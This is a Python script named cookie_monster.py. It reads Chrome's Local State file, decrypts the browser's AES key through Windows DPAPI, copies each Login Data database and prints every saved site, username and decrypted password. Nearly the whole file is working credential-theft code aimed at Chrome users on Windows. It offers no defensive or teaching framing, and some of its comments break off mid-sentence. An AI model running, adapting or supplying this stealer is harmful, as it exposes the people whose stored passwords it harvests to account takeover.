# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
# Name        : cookie_monster.py                                                               #
# Developer   : Michelangelo Splinter                                                           #
# Date        : Who gives a damn                                                                #
#                                                                                               #
# Description :                                                                                 #
#     This Program Locates and extracts the aes encryption key used to encrypt the passwords    #
#     stored as coockies in the AppData. then                                                   #
# pip command:                                                                                  #
#     "pip3 install pycryptodomex pypiwin32"                                                    #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

import re
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


def get_chrome_datetime(chromedate):
    """
    Return a `datetime.datetime` object from a chrome format datetime Since 
    `chromedate` is formatted as the number of microseconds since January, 1601
    """
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    """
    This Function loads an encryption key as a json file, decodes it
    """

    # Joining the path of the file containing the encryption key
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

    # Extracting the content and converying it to json format
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()                    # Reading it
        local_state = json.loads(local_state)     # Converting to json format

    # Decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    
    # remove DPAPI str
    key = key[5:]
    
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    """
    This function gets the encrypted password and the encryption key. then, it decrypts 
    the password with the key and the 
    """
    try:
        
        # Get the initialization vector & the password from the sql query
        iv = password[3:15]
        password = password[15:]
        
        # Generate AES cipher using the iv and the key
        cipher = AES.new(key, AES.MODE_GCM, iv)
        
        # Return decrypted password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def GetFolders():
    """
    This function finds all Login data files in AppData. and returns a list of full paths of all of them.
    """

    # The base path
    Main_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    
    # All sub folders
    Folders = [Main_path + "\\" + x for x in os.listdir(Main_path)]

    # Stores all files
    Final = []
    for i in Folders:
        try:
            for j in os.listdir(i):

                # Using regex to find cookie files and appending them to the Final list
                files = [i + "\\" + x for x in re.findall("Login Data.*", j)]
                for z in files:
                    Final += [z]
        except NotADirectoryError:
            pass
    return Final


def main():
    
    # get the AES key
    key = get_encryption_key()
    
    # Getting the local sqlite Chrome database paths
    db_paths = GetFolders()

    # Performing the extraction for each login data file
    for db_path in db_paths:
        
        # copy the file to another location as the database will be locked if 
        # chrome is currently running, basically creating a shadow copy
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        
        # connect to the database with sqlite3 module
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        
        # `logins` table has the data we need
        try:     
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            
        # in case the file doesnt contain the table
        except sqlite3.OperationalError:
            pass
        

        # Itirating over the results (one file could store multiple results)
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]   

            # Checking that a least one of the important fiels isn't null
            if username or password:

                # Print the results
                print(f"Origin URL    : {origin_url}")
                print(f"Action URL    : {action_url}")
                print(f"Username      : {username}")
                print(f"Password      : {password}")
            else:
                continue

            # Print time in readable formatt
            if date_created != 86400000000 and date_created:
                print(f"Creation      : {str(get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                print(f"Accessed      : {str(get_chrome_datetime(date_last_used))}")
            print("\n"+""*50)
        
        # Close the sqlite3 connection
        cursor.close()
        db.close()
        
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass


if __name__ == "__main__":
    main()
